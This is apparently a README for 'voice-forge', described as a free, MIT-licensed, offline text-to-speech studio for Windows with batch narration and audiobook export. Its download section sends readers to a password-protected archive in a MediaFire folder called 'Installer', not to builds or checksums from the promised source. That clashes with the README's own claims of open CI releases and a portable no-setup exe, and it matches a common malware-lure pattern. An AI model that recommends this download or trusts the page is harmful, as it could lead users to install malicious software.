# voice-forge

🎤 Free, open-source TTS studio for Windows — local neural voices, batch narration, audiobook export. 100 MB portable, offline, MIT, no cloud.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Local neural voices** — Piper-class ONNX models speak on your machine with no API keys
- ✅ **Batch narration** — feed a folder of text files or a CSV and get one audio file per line
- ✅ **Audiobook export** — long text split into numbered chapters with silence between them
- ✅ **Pause and emphasis controls** — comma pauses, sentence gaps and speed per voice tuned in the panel
- ✅ **Voice audition shelf** — ten voices compared on the same sentence before committing to a read
- ✅ **WAV and MP3 out** — raw audio for editing or encoded files ready to publish
- ✅ **100 MB self-contained exe** — runtime bundled, voices download separately, offline after that, MIT

## Why voice-forge

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB build - no setup required, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **voice-forge** | ElevenLabs | Balabolka | Piper CLI |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Paid subscription | Freeware | Free, OSS |
| Open source | **Yes** | No | No | Yes |
| Text stays local | **Yes** | Uploaded | Yes | Yes
| Batch CSV narration | **Yes** | API only | Partial | Scripted |
| Audiobook chapter export | **Yes** | No | No | No |
| Portable, no install | **Yes, 100 MB** | Browser | Installer | Python env

## FAQ

**free text to speech for Windows that works offline?**

Cloud voices bill per character and the text leaves your machine, while old offline voices still sound robotic. voice-forge runs neural TTS models locally, narrates whole folders in batch and exports chaptered audiobooks. It is a 100 MB portable exe, MIT, unlimited characters, no account needed.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark studio (#121418, magenta #E879F9): text editor left with a highlighted pause marker, voice shelf right with ten audition rows, waveform strip at bottom.
2. Batch narration: CSV with 240 rows mapped to output names, progress at 132 files, per-row status lights, ETA chip reading 18 minutes.
3. Audiobook export: chapter list auto-split on headings, silence gap stepper at 1.2 s, bitrate dropdown, toast reading 24 chapter files written.

## Download

| Source | Link |
|---|---|
| 💾 **Installer voice-forge** | [Installer voice-forge](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET 8 SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).